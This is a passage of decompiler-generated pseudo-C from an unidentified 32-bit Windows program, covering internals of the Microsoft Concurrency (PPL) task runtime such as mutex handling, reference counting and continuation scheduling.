    v5 = operator new(8u);
    *v5 = a2;
    v5[1] = 0;
    if ( *(_DWORD *)(this + 60) )
      *(_DWORD *)(*(_DWORD *)(this + 64) + 4) = v5;
    else
      *(_DWORD *)(this + 60) = v5;
    *(_DWORD *)(this + 64) = v5;
  }
  result = _Mtx_unlock(v12);
  if ( result )
    std::_Throw_C_error(result);
  if ( v3 )
  {
LABEL_10:
    CurrentThreadId = GetCurrentThreadId();
    if ( !_InterlockedCompareExchange((volatile signed __int32 *)(a2 + 8), CurrentThreadId, 0) )
    {
      (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2);
      v8 = _InterlockedCompareExchange((volatile signed __int32 *)(a2 + 8), 3, CurrentThreadId);
      if ( v8 != CurrentThreadId )
        CurrentThreadId = v8;
      if ( CurrentThreadId == 2 )
      {
        v9 = _Mtx_lock((_Mtx_t)(a2 + 52));
        if ( v9 )
          std::_Throw_C_error(v9);
        *(_BYTE *)(a2 + 100) = 1;
        v10 = _Mtx_unlock((_Mtx_t)(a2 + 52));
        if ( v10 )
          std::_Throw_C_error(v10);
        v11 = _Cnd_broadcast((_Cnd_t)(a2 + 12));
        if ( v11 )
          std::_Throw_C_error(v11);
      }
    }
    result = _InterlockedDecrement((volatile signed __int32 *)(a2 + 4));
    if ( !result )
      return (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 4))(a2);
  }
  return result;
}

//----- (00406AD0) --------------------------------------------------------
int __thiscall sub_406AD0(int this, int a2)
{
  struct _Mtx_internal_imp_t *v3; // esi
  int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // edx
  int v7; // ecx
  volatile signed __int32 *v8; // ebx
  int result; // eax
  int v10; // esi
  int v11; // eax
  char v12; // [esp+17h] [ebp-19h]

  v3 = (struct _Mtx_internal_imp_t *)(this + 12);
  v12 = 0;
  v4 = _Mtx_lock((_Mtx_t)(this + 12));
  if ( v4 )
LABEL_28:
    std::_Throw_C_error(v4);
  v5 = *(_DWORD **)(this + 60);
  if ( v5 )
  {
    v6 = 0;
    while ( 1 )
    {
      v7 = v5[1];
      if ( *v5 == a2 )
        break;
      v6 = v5;
      v5 = (_DWORD *)v5[1];
      if ( !v7 )
        goto LABEL_13;
    }
    if ( v6 )
      v6[1] = v7;
    else
      *(_DWORD *)(this + 60) = v7;
    if ( !v5[1] )
      *(_DWORD *)(this + 64) = v6;
    sub_44775B(v5);
LABEL_13:
    v8 = (volatile signed __int32 *)(a2 + 8);
    _InterlockedExchange((volatile __int32 *)(a2 + 8), 2);
    if ( !_InterlockedDecrement((volatile signed __int32 *)(a2 + 4)) )
      (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 4))(a2);
  }
  else
  {
    v12 = 1;
    v8 = (volatile signed __int32 *)(a2 + 8);
  }
  result = _Mtx_unlock(v3);
  if ( result )
    std::_Throw_C_error(result);
  if ( v12 )
  {
    result = _InterlockedCompareExchange(v8, 1, 0);
    v10 = result;
    if ( result )
    {
      switch ( result )
      {
        case 0:
        case 1:
        case 2:
        case 3:
          return result;
        default:
          result = GetCurrentThreadId();
          if ( v10 == result )
            return result;
          result = _InterlockedExchange(v8, 2);
          if ( result == 3 )
            return result;
          v11 = _Mtx_lock((_Mtx_t)(a2 + 52));
          if ( v11 )
            std::_Throw_C_error(v11);
          if ( *(_BYTE *)(a2 + 100) )
            goto LABEL_26;
          break;
      }
      do
      {
        v4 = sub_42F842(a2 + 12, (_Mtx_t)(a2 + 52));
        if ( v4 )
          goto LABEL_28;
      }
      while ( !*(_BYTE *)(a2 + 100) );
LABEL_26:
      result = _Mtx_unlock((_Mtx_t)(a2 + 52));
      if ( result )
        std::_Throw_C_error(result);
    }
  }
  return result;
}

//----- (00406C80) --------------------------------------------------------
int __thiscall sub_406C80(volatile signed __int32 **this)
{
  volatile signed __int32 *v2; // ecx
  int result; // eax

  v2 = *this;
  if ( v2 )
  {
    result = _InterlockedDecrement(v2 + 1);
    if ( !result )
      result = (*(int (__thiscall **)(volatile signed __int32 *))(*v2 + 4))(v2);
  }
  *this = 0;
  return result;
}

//----- (00406CE0) --------------------------------------------------------
int __cdecl sub_406CE0(int a1)
{
  (*(void (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1);
  return (**(int (__thiscall ***)(int, int))a1)(a1, 1);
}

//----- (00406D30) --------------------------------------------------------
_DWORD *__thiscall sub_406D30(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::_TaskProcHandle::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 49DE5C: using guessed type void *Concurrency::details::_TaskProcHandle::`vftable';

//----- (00406D60) --------------------------------------------------------
int __thiscall sub_406D60(int this)
{
  struct _Mtx_internal_imp_t *v2; // edi
  int v3; // eax
  int result; // eax

  v2 = (struct _Mtx_internal_imp_t *)(this + 40);
  v3 = _Mtx_lock((_Mtx_t)(this + 40));
  if ( v3 )
    goto LABEL_7;
  if ( *(int *)(this + 100) < 2 )
  {
    while ( 1 )
    {
      v3 = sub_42F842(this, v2);
      if ( v3 )
        break;
      if ( *(int *)(this + 100) >= 2 )
        goto LABEL_5;
    }
LABEL_7:
    std::_Throw_C_error(v3);
  }
LABEL_5:
  result = _Mtx_unlock(v2);
  if ( result )
    std::_Throw_C_error(result);
  return result;
}

//----- (00406E10) --------------------------------------------------------
int __thiscall sub_406E10(char *this)
{
  struct _Mtx_internal_imp_t *v2; // esi
  int v3; // eax
  int v4; // eax
  int result; // eax

  v2 = (struct _Mtx_internal_imp_t *)(this + 40);
  v3 = _Mtx_lock((_Mtx_t)(this + 40));
  if ( v3 )
    std::_Throw_C_error(v3);
  if ( *((int *)this + 25) < 2 )
    *((_DWORD *)this + 25) = 2;
  v4 = _Cnd_broadcast((_Cnd_t)this);
  if ( v4 )
    std::_Throw_C_error(v4);
  result = _Mtx_unlock(v2);
  if ( result )
    std::_Throw_C_error(result);
  return result;
}

//----- (00406EA0) --------------------------------------------------------
void __usercall sub_406EA0(_DWORD *a1@<edx>, int a2)
{
  _DWORD *v3; // eax
  volatile signed __int32 *v4; // esi

  if ( a2 == -1 )
  {
    sub_407060(a1);
  }
  else
  {
    v3 = (_DWORD *)sub_406770();
    v4 = (volatile signed __int32 *)v3[1];
    if ( v4 )
    {
      _InterlockedIncrement(v4 + 1);
      v4 = (volatile signed __int32 *)v3[1];
    }
    if ( *v3 )
      (**(void (__thiscall ***)(_DWORD, void (__cdecl *)(_DWORD *), _DWORD *))*v3)(*v3, sub_407060, a1);
    else
      sub_406690((int)sub_407060, (int)a1);
    if ( v4 && !_InterlockedExchangeAdd(v4 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v4)(v4);
      if ( !_InterlockedDecrement(v4 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v4 + 4))(v4);
    }
  }
}

//----- (00406F70) --------------------------------------------------------
int __thiscall sub_406F70(_DWORD *this)
{
  volatile signed __int32 *v1; // esi
  int result; // eax

  v1 = (volatile signed __int32 *)this[1];
  if ( v1 )
  {
    result = _InterlockedExchangeAdd(v1 + 1, 0xFFFFFFFF);
    if ( !result )
    {
      result = (**(int (__thiscall ***)(volatile signed __int32 *))v1)(v1);
      if ( !_InterlockedDecrement(v1 + 2) )
        return (*(int (__thiscall **)(volatile signed __int32 *))(*v1 + 4))(v1);
    }
  }
  return result;
}

//----- (00406FA0) --------------------------------------------------------
void __thiscall __noreturn sub_406FA0(void *this)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_4065C0(pExceptionObject, (int)this);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
}

//----- (00406FC0) --------------------------------------------------------
char *__thiscall sub_406FC0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &Concurrency::invalid_operation::`vftable';
  return this;
}
// 45E3C0: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 48F974: using guessed type void *std::exception::`vftable';
// 4939AC: using guessed type void *Concurrency::invalid_operation::`vftable';

//----- (00407060) --------------------------------------------------------
void __cdecl sub_407060(_DWORD *Block)
{
  int v1; // ecx
  _DWORD *v2; // ecx

  v1 = Block[9];
  if ( !v1 )
    std::_Xbad_function_call();
  (*(void (__thiscall **)(int))(*(_DWORD *)v1 + 8))(v1);
  v2 = (_DWORD *)Block[9];
  if ( v2 )
  {
    (*(void (__stdcall **)(bool))(*v2 + 16))(v2 != Block);
    Block[9] = 0;
  }
  sub_44775B(Block);
}

//----- (00407110) --------------------------------------------------------
int __thiscall sub_407110(_DWORD *this)
{
  _DWORD *v2; // ecx
  int result; // eax

  v2 = (_DWORD *)this[9];
  if ( v2 )
  {
    result = (*(int (__stdcall **)(bool))(*v2 + 16))(v2 != this);
    this[9] = 0;
  }
  return result;
}

//----- (00407140) --------------------------------------------------------
void sub_407140()
{
  ;
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();

//----- (00407180) --------------------------------------------------------
void __thiscall sub_407180(_DWORD *this)
{
  _DWORD *v2; // eax

  if ( !*this )
    __debugbreak();
  v2 = (_DWORD *)this[4];
  if ( v2 )
  {
    if ( ((this[6] - (_DWORD)v2) & 0xFFFFFFFC) >= 0x1000 )
    {
      if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v2 = (_DWORD *)*(v2 - 1);
    }
    sub_44775B(v2);
    this[4] = 0;
    this[5] = 0;
    this[6] = 0;
  }
  __ExceptionPtrDestroy(this + 1);
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();

//----- (00407220) --------------------------------------------------------
void __thiscall __noreturn sub_407220(volatile __int32 *Block)
{
  int v2; // [esp-8h] [ebp-10h] BYREF

  if ( !sub_409B40((void *)Block) )
    sub_40A5E0(Block, 1);
  sub_405C40(&v2, (void *)(Block + 1));
  sub_405C90(v2);
}

//----- (00407250) --------------------------------------------------------
unsigned int *__thiscall sub_407250(unsigned int *this, unsigned int *a2)
{
  _BYTE *v3; // edx
  _BYTE *v4; // eax
  int v5; // edi
  char *v6; // esi
  size_t Size; // [esp+8h] [ebp-8h]
  void *Src; // [esp+Ch] [ebp-4h]

  *this = *a2;
  this[1] = 0;
  this[2] = 0;
  this[3] = 0;
  v3 = (_BYTE *)a2[1];
  v4 = (_BYTE *)a2[2];
  Src = v3;
  if ( v3 != v4 )
  {
    Size = v4 - v3;
    v5 = (v4 - v3) >> 2;
    sub_40A1C0(this + 1, v5);
    v6 = (char *)this[1];
    memmove_0(v6, Src, Size);
    this[2] = (unsigned int)&v6[4 * v5];
  }
  return this;
}

//----- (004072C0) --------------------------------------------------------
unsigned int *__thiscall sub_4072C0(unsigned int *this, unsigned int *a2)
{
  unsigned int *v3; // edi
  signed int v4; // eax
  _DWORD *v5; // edx
  unsigned int v6; // ecx
  unsigned int v7; // esi
  unsigned int v8; // eax
  unsigned int v9; // esi
  void *Src; // [esp+8h] [ebp-Ch]
  signed int v12; // [esp+Ch] [ebp-8h]
  unsigned int v13; // [esp+10h] [ebp-4h]

  v3 = this + 1;
  *this = *a2;
  if ( this + 1 != a2 + 1 )
  {
    v4 = a2[2] - a2[1];
    v5 = (_DWORD *)*v3;
    Src = (void *)a2[1];
    v12 = v4;
    v6 = (int)(this[3] - this[1]) >> 2;
    v7 = v4 >> 2;
    if ( v4 >> 2 > v6 )
    {
      if ( v7 > 0x3FFFFFFF )
        sub_404860();
      v13 = v6 >> 1;
      if ( v6 <= 0x3FFFFFFF - (v6 >> 1) )
      {
        v8 = v6 + v13;
        if ( v6 + v13 < v7 )
          v8 = v7;
        v7 = v8;
      }
      if ( v5 )
      {
        if ( 4 * v6 >= 0x1000 )
        {
          if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
            _invalid_parameter_noinfo_noreturn();
          v5 = (_DWORD *)*(v5 - 1);
        }
        sub_44775B(v5);
        *v3 = 0;
        v3[1] = 0;
        v3[2] = 0;
      }
      sub_40A1C0(v3, v7);
      v4 = v12;
    }
    v9 = *v3;
    memmove_0((void *)*v3, Src, v4);
    v3[1] = v9 + v12;
  }
  return this;
}
// 404860: using guessed type void __noreturn sub_404860(void);

//----- (004073B0) --------------------------------------------------------
void sub_4073B0()
{
  ;
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();

//----- (004073F0) --------------------------------------------------------
char *__thiscall sub_4073F0(char *this, int a2, int a3, volatile signed __int32 *a4, int a5)
{
  volatile signed __int32 *v6; // edi

  *(_DWORD *)this = &Concurrency::details::_Task_impl_base::`vftable';
  *((_DWORD *)this + 1) = 0;
  *((_WORD *)this + 4) = 0;
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = 0;
  _Mtx_init_in_situ((_Mtx_t)(this + 20), 2);
  v6 = a4;
  *((_DWORD *)this + 17) = 0;
  *((_DWORD *)this + 19) = 0;
  if ( a4 )
  {
    _InterlockedIncrement(a4 + 1);
    v6 = a4;
  }
  sub_42F834(this + 80);
  _Mtx_init_in_situ((_Mtx_t)(this + 120), 2);
  *((_DWORD *)this + 42) = 0;
  *((_DWORD *)this + 43) = 0;
  if ( v6 )
    _InterlockedIncrement(v6 + 1);
  *((_DWORD *)this + 42) = a3;
  *((_DWORD *)this + 43) = v6;
  *((_DWORD *)this + 44) = a5;
  *((_DWORD *)this + 45) = 0;
  if ( v6 )
  {
    if ( !_InterlockedExchangeAdd(v6 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v6)(v6);
      if ( !_InterlockedExchangeAdd(v6 + 2, 0xFFFFFFFF) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v6 + 4))(v6);
    }
  }
  *((_DWORD *)this + 47) = 0;
  *((_DWORD *)this + 48) = 0;
  *((_DWORD *)this + 49) = 0;
  *((_DWORD *)this + 46) = 0;
  *((_DWORD *)this + 50) = this;
  *((_WORD *)this + 102) = 0;
  *((_DWORD *)this + 18) = a2;
  if ( a2 != 2 )
    _InterlockedIncrement((volatile signed __int32 *)(a2 + 4));
  if ( a4 )
  {
    if ( !_InterlockedExchangeAdd(a4 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))a4)(a4);
      if ( !_InterlockedDecrement(a4 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*a4 + 4))(a4);
    }
  }
  return this;
}
// 42F834: using guessed type _DWORD __cdecl sub_42F834(_DWORD);
// 49DF20: using guessed type void *Concurrency::details::_Task_impl_base::`vftable';

//----- (00407540) --------------------------------------------------------
void __thiscall sub_407540(char *this)
{
  volatile signed __int32 *v2; // ecx
  _DWORD *v3; // eax
  volatile signed __int32 *v4; // ebx
  volatile signed __int32 *v5; // esi

  v2 = (volatile signed __int32 *)*((_DWORD *)this + 18);
  *(_DWORD *)this = &Concurrency::details::_Task_impl_base::`vftable';
  if ( v2 != (volatile signed __int32 *)2 && !_InterlockedDecrement(v2 + 1) )
    (*(void (__thiscall **)(volatile signed __int32 *))(*v2 + 4))(v2);
  v3 = (_DWORD *)*((_DWORD *)this + 47);
  if ( v3 )
  {
    if ( ((*((_DWORD *)this + 49) - (_DWORD)v3) & 0xFFFFFFFC) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
    *((_DWORD *)this + 47) = 0;
    *((_DWORD *)this + 48) = 0;
    *((_DWORD *)this + 49) = 0;
  }
  v4 = (volatile signed __int32 *)*((_DWORD *)this + 43);
  if ( v4 )
  {
    if ( !_InterlockedExchangeAdd(v4 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v4)(v4);
      if ( !_InterlockedExchangeAdd(v4 + 2, 0xFFFFFFFF) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v4 + 4))(v4);
    }
  }
  _Mtx_destroy_in_situ((_Mtx_t)(this + 120));
  _Cnd_destroy_in_situ((_Cnd_t)(this + 80));
  _Mtx_destroy_in_situ((_Mtx_t)(this + 20));
  v5 = (volatile signed __int32 *)*((_DWORD *)this + 4);
  if ( v5 && !_InterlockedExchangeAdd(v5 + 1, 0xFFFFFFFF) )
  {
    (**(void (__thiscall ***)(volatile signed __int32 *))v5)(v5);
    if ( !_InterlockedDecrement(v5 + 2) )
      (*(void (__thiscall **)(volatile signed __int32 *))(*v5 + 4))(v5);
  }
}
// 49DF20: using guessed type void *Concurrency::details::_Task_impl_base::`vftable';

//----- (00407670) --------------------------------------------------------
int __thiscall sub_407670(int this)
{
  bool v2; // zf
  int v3; // ecx
  volatile __int32 *v5; // eax
  int v6; // [esp+0h] [ebp-2Ch] BYREF
  int v7; // [esp+10h] [ebp-1Ch]
  int v8; // [esp+18h] [ebp-14h]
  int *v9; // [esp+1Ch] [ebp-10h]
  int v10; // [esp+28h] [ebp-4h]

  v9 = &v6;
  v8 = this;
  v2 = *(_BYTE *)(this + 8) == 0;
  v3 = this + 80;
  if ( v2 )
  {
    v10 = 0;
    v7 = v3;
    sub_406D60(v3);
    v10 = -1;
    if ( !*(_BYTE *)(this + 9) )
      goto LABEL_5;
    v3 = v7;
  }
  sub_406D60(v3);
LABEL_5:
  if ( *(_DWORD *)(this + 12) )
  {
    v5 = (volatile __int32 *)sub_409B40((void *)(this + 12));
    sub_407220(v5);
  }
  return (*(_DWORD *)(this + 4) == 4) + 1;
}

//----- (00407760) --------------------------------------------------------
char __thiscall sub_407760(unsigned int *this, void *a2)
{
  unsigned int *v2; // ebx
  char v3; // al
  volatile signed __int32 *v4; // esi
  char v5; // bl
  _BYTE *v6; // edx
  unsigned int v8; // [esp+10h] [ebp-34h] BYREF
  void *Block; // [esp+14h] [ebp-30h]
  int v10; // [esp+1Ch] [ebp-28h]
  _DWORD *v11; // [esp+20h] [ebp-24h]
  void *v12; // [esp+24h] [ebp-20h]
  int (__thiscall *v13)(unsigned int *, int, int, _DWORD, _DWORD **); // [esp+28h] [ebp-1Ch]
  unsigned int *v14; // [esp+2Ch] [ebp-18h]
  _DWORD *v15; // [esp+30h] [ebp-14h] BYREF
  volatile signed __int32 *v16; // [esp+34h] [ebp-10h]
  int v17; // [esp+40h] [ebp-4h]

  v14 = this;
  v13 = *(int (__thiscall **)(unsigned int *, int, int, _DWORD, _DWORD **))(*this + 4);
  sub_407250(&v8, this + 46);
  v17 = 0;
  v2 = (unsigned int *)operator new(0x28u);
  v12 = v2;
  *(_QWORD *)v2 = 0i64;
  v2[2] = 0;
  v2[1] = 1;
  v2[2] = 1;
  *v2 = (unsigned int)&std::_Ref_count_obj2<Concurrency::details::_ExceptionHolder>::`vftable';
  v11 = v2 + 3;
  v2[3] = 0;
  __ExceptionPtrCopy(v2 + 4, a2);
  LOBYTE(v17) = 2;
  sub_407250(v2 + 6, &v8);
  v15 = v2 + 3;
  v16 = (volatile signed __int32 *)v2;
  LOBYTE(v17) = 3;
  v3 = v13(v14, 1, 1, 0, &v15);
  v4 = v16;
  v5 = v3;
  if ( v16 )
  {
    if ( !_InterlockedExchangeAdd(v16 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v4)(v4);
      if ( !_InterlockedDecrement(v4 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v4 + 4))(v4);
    }
  }
  v6 = Block;
  if ( Block )
  {
    if ( ((v10 - (_DWORD)Block) & 0xFFFFFFFC) >= 0x1000 )
    {
      v6 = (_BYTE *)*((_DWORD *)Block - 1);
      if ( (unsigned int)((_BYTE *)Block - v6 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v6);
  }
  return v5;
}
// 49DF0C: using guessed type void *std::_Ref_count_obj2<Concurrency::details::_ExceptionHolder>::`vftable';

//----- (004078A0) --------------------------------------------------------
bool __thiscall sub_4078A0(_DWORD *this)
{
  return this[3] != 0;
}

//----- (004078B0) --------------------------------------------------------
int __thiscall sub_4078B0(_DWORD *this, int a2, int a3)
{
  int (__thiscall ***v4)(_DWORD, int (__cdecl *)(int), int); // ecx
  _DWORD v5[6]; // [esp+0h] [ebp-2Ch] BYREF
  void **v6; // [esp+18h] [ebp-14h]
  _DWORD *v7; // [esp+1Ch] [ebp-10h]
  int v8; // [esp+28h] [ebp-4h]

  v7 = v5;
  v5[5] = this;
  v8 = 0;
  if ( a3 == -1 )
  {
    v6 = (void **)a2;
    LOBYTE(v8) = 1;
    (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 4))(a2);
    return (**(int (__thiscall ***)(int, int))a2)(a2, 1);
  }
  else
  {
    v4 = (int (__thiscall ***)(_DWORD, int (__cdecl *)(int), int))this[44];
    if ( v4 )
    {
      return (**v4)(v4, sub_406CE0, a2);
    }
    else
    {
      v6 = &Concurrency::details::_DefaultPPLTaskScheduler::`vftable';
      return sub_406690((int)sub_406CE0, a2);
    }
  }
}
// 49DDB4: using guessed type void *Concurrency::details::_DefaultPPLTaskScheduler::`vftable';

//----- (004079B0) --------------------------------------------------------
void __thiscall sub_4079B0(_DWORD *this, int a2)
{
  _DWORD *v3; // edi
  int v4; // edi
  _DWORD *v5; // esi
  volatile signed __int32 *v6; // edi
  int v7[9]; // [esp+Ch] [ebp-48h] BYREF
  int *v8; // [esp+30h] [ebp-24h]
  _DWORD *v9; // [esp+34h] [ebp-20h]
  void *Block; // [esp+38h] [ebp-1Ch]
  __int64 v11; // [esp+3Ch] [ebp-18h] BYREF
  int v12; // [esp+50h] [ebp-4h]

  v11 = 0i64;
  (*(void (__thiscall **)(int, __int64 *))(*(_DWORD *)a2 + 8))(a2, &v11);
  v12 = 0;
  if ( this[1] != 4 || *(_BYTE *)(a2 + 16) )
  {
    v3 = (_DWORD *)v11;
    nullsub_1(1);
    if ( *(_DWORD *)(a2 + 8) )
    {
      v4 = *(_DWORD *)(a2 + 20);
      if ( v4 != -1 )
      {
        *(_DWORD *)(a2 + 20) = 16;
        v4 = 16;
      }
      v7[0] = (int)std::X$$V::Z::_Func_impl_no_alloc<`Concurrency::details::_Task_impl_base::_ScheduleContinuationTask'::`5'::_lambda_1_,unsigned char * const,void,Concurrency::details::_ContinuationTaskHandleBase *>::`vftable';
      v7[1] = a2;
      v8 = v7;
      LOBYTE(v12) = 1;
      v5 = operator new(0x28u);
      Block = v5;
      v9 = v5;
      v5[9] = 0;
      LOBYTE(v12) = 3;
      if ( v8 )
        v5[9] = (*(int (__thiscall **)(int *, _DWORD *))*v8)(v8, v5);
      LOBYTE(v12) = 1;
      sub_406EA0(v5, v4);
      if ( v8 )
        (*(void (__stdcall **)(bool))(*v8 + 16))(v8 != v7);
    }
    else
    {
      sub_4078B0(v3, a2, *(_DWORD *)(a2 + 20));
    }
  }
  else
  {
    if ( this[3] )
      (*(void (__thiscall **)(_DWORD, int, int, int, _DWORD *))(*(_DWORD *)v11 + 4))(v11, 1, 1, 1, this + 3);
    else
      (*(void (__stdcall **)(int, _DWORD, _DWORD, _DWORD))(*(_DWORD *)v11 + 4))(1, 0, 0, v11 + 12);
    (**(void (__thiscall ***)(int, int))a2)(a2, 1);
  }
  v6 = (volatile signed __int32 *)HIDWORD(v11);
  if ( HIDWORD(v11) && !_InterlockedExchangeAdd((volatile signed __int32 *)(HIDWORD(v11) + 4), 0xFFFFFFFF) )
  {
    (**(void (__thiscall ***)(volatile signed __int32 *))v6)(v6);
    if ( !_InterlockedDecrement(v6 + 2) )
      (*(void (__thiscall **)(volatile signed __int32 *))(*v6 + 4))(v6);
  }
}
// 409260: using guessed type _DWORD __stdcall nullsub_1(_DWORD);
// 49DED4: using guessed type int (__stdcall *std::X$$V::Z::_Func_impl_no_alloc<`Concurrency::details::_Task_impl_base::_ScheduleContinuationTask'::`5'::_lambda_1_,unsigned char * const,void,Concurrency::details::_ContinuationTaskHandleBase *>::`vftable'[2])(int);

//----- (00407B30) --------------------------------------------------------
int __thiscall sub_407B30(int *this)
{
  int v2; // ecx
  bool v3; // bl
  int result; // eax
  volatile signed __int32 *v5; // esi
  int v6; // eax
  int v7; // ecx
  _DWORD *v8; // [esp-34h] [ebp-94h]
  _DWORD v9[9]; // [esp-30h] [ebp-90h] BYREF
  int v10; // [esp-Ch] [ebp-6Ch]
  int v11; // [esp-8h] [ebp-68h]
  int v12; // [esp+0h] [ebp-60h] BYREF
  int v13[9]; // [esp+10h] [ebp-50h] BYREF
  int *v14; // [esp+34h] [ebp-2Ch]
  int v15; // [esp+3Ch] [ebp-24h]
  int v16; // [esp+40h] [ebp-20h]
  __int64 v17; // [esp+44h] [ebp-1Ch] BYREF
  int *v18; // [esp+50h] [ebp-10h]
  int v19; // [esp+5Ch] [ebp-4h]

  v18 = &v12;
  v16 = 0;
  v2 = *this;
  v17 = 0i64;
  (*(void (__thiscall **)(int, __int64 *))(*(_DWORD *)v2 + 8))(v2, &v17);
  v19 = 1;
  v15 = 0;
  v16 = 1;
  v3 = *(_DWORD *)(*this + 8) == 0;
  LOBYTE(v19) = 0;
  if ( v3 )
  {
    result = sub_4078B0((_DWORD *)v17, *this, -1);
  }
  else
  {
    v6 = *this;
    v7 = HIDWORD(v17);
    if ( HIDWORD(v17) )
    {
      _InterlockedIncrement((volatile signed __int32 *)(HIDWORD(v17) + 4));
      v7 = HIDWORD(v17);
    }
    v13[1] = v6;
    v13[2] = v17;
    v13[0] = (int)std::X$$V::XZ::QBE::Z::_Func_impl_no_alloc<``Concurrency::details::_Task_impl_base::_ScheduleContinuationTask'::`5'::_lambda_1_::operator()'::`8'::_lambda_1_,unsigned char * const,void,Concurrency::details::_ContinuationTaskHandleBase *>::`vftable';
    v13[3] = v7;
    v14 = v13;
    v11 = 0;
    v16 = (int)v9;
    v10 = 0;
    LOBYTE(v19) = 5;
    if ( v13 )
    {
      v8 = v9;
      v10 = (*(int (__thiscall **)(int *))*v14)(v13);
    }
    LOBYTE(v19) = 4;
    result = Concurrency::details::_ContextCallback::_CallInContext(
               (char)v8,
               v9[0],
               v9[1],
               v9[2],
               v9[3],
               v9[4],
               v9[5],
               v9[6],
               v9[7],
               v9[8],
               v10);
    if ( v14 )
      result = (*(int (__cdecl **)(bool, int))(*v14 + 16))(v14 != v13, v11);
  }
  v5 = (volatile signed __int32 *)HIDWORD(v17);
  if ( HIDWORD(v17) )
  {
    result = _InterlockedExchangeAdd((volatile signed __int32 *)(HIDWORD(v17) + 4), 0xFFFFFFFF);
    if ( !result )
    {
      result = (**(int (__thiscall ***)(volatile signed __int32 *))v5)(v5);
      if ( !_InterlockedDecrement(v5 + 2) )
        return (*(int (__thiscall **)(volatile signed __int32 *))(*v5 + 4))(v5);
    }
  }
  return result;
}
// 407C5C: variable 'v8' is possibly undefined
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();
// 42F184: using guessed type _DWORD __stdcall Concurrency::details::_ContextCallback::_CallInContext(char, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 49DEB8: using guessed type int (__stdcall *std::X$$V::XZ::QBE::Z::_Func_impl_no_alloc<``Concurrency::details::_Task_impl_base::_ScheduleContinuationTask'::`5'::_lambda_1_::operator()'::`8'::_lambda_1_,unsigned char * const,void,Concurrency::details::_ContinuationTaskHandleBase *>::`vftable'[2])(int);

//----- (00407CB0) --------------------------------------------------------
char *__thiscall sub_407CB0(char *Block, char a2)
{
  sub_407540(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00407D00) --------------------------------------------------------
int __cdecl sub_407D00(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int *a10)
{
  int v10; // ecx
  int v11; // edi
  char *v12; // esi
  char *v13; // ecx
  char v15[36]; // [esp+10h] [ebp-40h] BYREF
  char *v16; // [esp+34h] [ebp-1Ch]
  _DWORD *v17; // [esp+38h] [ebp-18h]
  int v18; // [esp+3Ch] [ebp-14h]
  char *v19; // [esp+40h] [ebp-10h]
  int v20; // [esp+4Ch] [ebp-4h]

  v11 = v10;
  v18 = v10;
  v20 = 1;
  v19 = v15;
  v16 = 0;
  if ( a10 )
    v16 = (char *)(*(int (__thiscall **)(int *, char *))*a10)(a10, v15);
  *(_DWORD *)(v11 + 36) = 0;
  LOBYTE(v20) = 3;
  v12 = (char *)operator new(0x30u);
  v19 = v12;
  *(_DWORD *)v12 = ___7___Func_impl_no_alloc_V_lambda_1___1___MakeVoidToUnitFunc_details_Concurrency__YA_AV__function___A6AEXZ_std__ABV__function___A6AXXZ_6__Z_E__V_std__6B_;
  v17 = v12 + 8;
  *((_DWORD *)v12 + 11) = 0;
  LOBYTE(v20) = 5;
  v13 = v16;
  if ( v16 )
  {
    *((_DWORD *)v12 + 11) = (**(int (__thiscall ***)(char *, int))v16)(v16, (int)(v12 + 8));
    v13 = v16;
  }
  *(_DWORD *)(v11 + 36) = v12;
  if ( v13 )
    (*(void (__stdcall **)(bool))(*(_DWORD *)v13 + 16))(v13 != v15);
  if ( a10 )
    (*(void (__stdcall **)(bool))(*a10 + 16))(a10 != &a1);
  return v11;
}
// 407D28: variable 'v10' is possibly undefined
// 49DE74: using guessed type int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___1___MakeVoidToUnitFunc_details_Concurrency__YA_AV__function___A6AEXZ_std__ABV__function___A6AXXZ_6__Z_E__V_std__6B_[2])(int);

//----- (00407DF0) --------------------------------------------------------
void __thiscall sub_407DF0(_DWORD *this)
{
  _DWORD *v2; // ecx
